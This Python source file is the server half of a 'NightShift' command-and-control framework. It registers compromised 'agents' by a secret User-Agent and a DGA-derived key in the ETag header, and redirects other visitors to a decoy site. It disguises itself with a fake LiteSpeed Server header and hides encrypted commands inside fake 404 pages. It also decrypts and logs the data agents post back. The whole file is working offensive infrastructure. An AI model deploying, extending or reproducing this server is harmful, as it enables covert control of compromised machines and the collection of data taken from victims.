#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# NightShift Server - Burning the midnight oil

import json
import logging
import sys
from datetime import datetime
from aiohttp import web
from nightshift_dga import NightShift_DGA
from nightshift_cipher import NightShift_Cipher

def ns_server_log(ns_post_log2file):
    time_stamp = datetime.now()
    log_time = time_stamp.strftime('%Y%m%d')
    ns_post_log = log_time + '_nightshift_post.log'
    logging.basicConfig(format='%(asctime)s - %(message)s', filename=ns_post_log, level=logging.INFO)
    logging.info(ns_post_log2file)


def nc_server_config(num):
    ns_sconfig_read_path = 'ns_s_config.json'
    with open(ns_sconfig_read_path) as ns_sconfig_f:
        ns_sconfig_data = json.load(ns_sconfig_f)
        ns_getua_data = ns_sconfig_data.get('ns_get_ua')
        ns_postua_data = ns_sconfig_data.get('ns_post_ua')
        ns_initsite_data = ns_sconfig_data.get('ns_init_suri')
        ns_initsitep_data = ns_sconfig_data.get('ns_init_surip')
        ns_fofsite_data = ns_sconfig_data.get('ns_fof_suri')
        ns_postsite_data = ns_sconfig_data.get('ns_post_suri')
        ns_aio_lp_data = ns_sconfig_data.get('ns_aiohttp_lp')
        ns_redirect_data = ns_sconfig_data.get('ns_redirect_url')
    if num == 0: 
        return ns_getua_data
    if num == 1: 
        return ns_postua_data
    if num == 2: 
        return ns_initsite_data
    if num == 3: 
        return ns_initsitep_data
    if num == 4: 
        return ns_fofsite_data
    if num == 5: 
        return ns_postsite_data
    if num == 6: 
        return ns_aio_lp_data
    if num == 7: 
        return ns_redirect_data
    else: 
        print('Something is wrong, now exiting - number: {0}'.format(num))
        sys.exit(1)
            
async def CommsCheck(request):
    ns_cget_ua = nc_server_config(0)
    ns_rdrct_url = nc_server_config(7)
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk ==  ns_cget_ua and ns_et_chk == ns_hsh_key):
        print('[+] {0:s} --> New agent coming online. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Test Sucessful', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound(ns_rdrct_url)

async def Init_Output(request):
    ns_cpost_ua = nc_server_config(1)
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_resp_data = await request.read()
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == ns_cpost_ua and ns_et_chk == ns_hsh_key):
        ns_resp_data = ns_resp_data.decode('ascii')
        ns_post_log2file = ns_get_cipher.decrypt(ns_resp_data)
        print(ns_post_log2file)
        ns_server_log(ns_post_log2file)
        print('[+] {0:s} --> New agent initialized. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Initialization Complete, welcome to the nightshift.', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Ahhhh, what\'s going on?')

async def FourOFour(request):
    ns_cget_ua = nc_server_config(0)
    ns_rdrct_url = nc_server_config(7)
    time_stamp = datetime.now()
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == ns_cget_ua and ns_et_chk == ns_hsh_key):
        print('[+] {0:s} --> A Nightshift Agent has requested payload. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        ns_cmd_path = "ns_fof_cmd.json"
        ns_custom_fof_path = 'ns_custom_fof.txt'
        with open(ns_cmd_path, 'r') as ns_cmd_f:
            ns_cmd_f = ns_cmd_f.read()
            ns_cipher_cmd = ns_get_cipher.encrypt(ns_cmd_f)
        with open(ns_custom_fof_path, 'r') as ns_custom_fof_f:
            ns_custom_fof_f = ns_custom_fof_f.read()
            ns_custom_fof_f += '<!--HTMLDOC:'+ns_cipher_cmd+'HTMLDOC>'
        return web.HTTPNotFound(
                    text=ns_custom_fof_f,
                    content_type="text/html"
                    )
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.HTTPFound(ns_rdrct_url)

async def Post_Output(request):
    time_stamp = datetime.now()
    #log_time = time_stamp.strftime('%Y%m%d')
    #ns_post_log = log_time + '_nightshift_post.log'
    #logging.basicConfig(format='%(asctime)s - %(message)s', filename=ns_post_log, level=logging.INFO)
    ns_cpost_ua = nc_server_config(1)
    ns_get_key = NightShift_DGA()
    ns_get_cipher = NightShift_Cipher()
    ns_hdr_key = ns_get_key.ns_dga_algorithm('key')
    ns_hsh_key = ns_get_cipher.hash_keys_hosts(ns_hdr_key)
    ns_hdr = request.headers
    ns_rmt_ip = request.remote
    ns_resp_data = await request.read()
    ns_ua_chk = ns_hdr.get('User-Agent')
    ns_et_chk = ns_hdr.get('ETag')
    if (ns_ua_chk == ns_cpost_ua and ns_et_chk == ns_hsh_key):
        ns_resp_data = ns_resp_data.decode('ascii')
        ns_decrypted_data =  ns_get_cipher.decrypt(ns_resp_data)
        ns_post_log2file = { "time": str(time_stamp), "ns_client_ip": ns_rmt_ip, "ns_post_data": ns_decrypted_data }
        #logging.info(ns_post_log2file)
        ns_server_log(ns_post_log2file)
        print('[+] {0:s} --> A Nightshift Agent has responded with it data output Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='NightShift hours recorded', headers={ 'Server': 'LiteSpeed 3.13.37' })
    else:
        print('[+] {0:s} --> Someone knocking but does not have the goods. Remote IP: {1:s} UserAgent: {2:s}'.format(str(time_stamp),ns_rmt_ip,ns_ua_chk))
        return web.Response(text='Ahhhh, what\'s going on?')

ns_init_route = nc_server_config(2)
ns_initp_route = nc_server_config(3)
ns_fof_route = nc_server_config(4)
ns_post_route = nc_server_config(5)
ns_svr_lp = nc_server_config(6)
app = web.Application()
app.add_routes([web.get(ns_init_route, CommsCheck),
                web.post(ns_initp_route, Init_Output),
                web.get(ns_fof_route, FourOFour),
                web.post(ns_post_route, Post_Output)])

if __name__ == '__main__':
    web.run_app(app, port=ns_svr_lp)
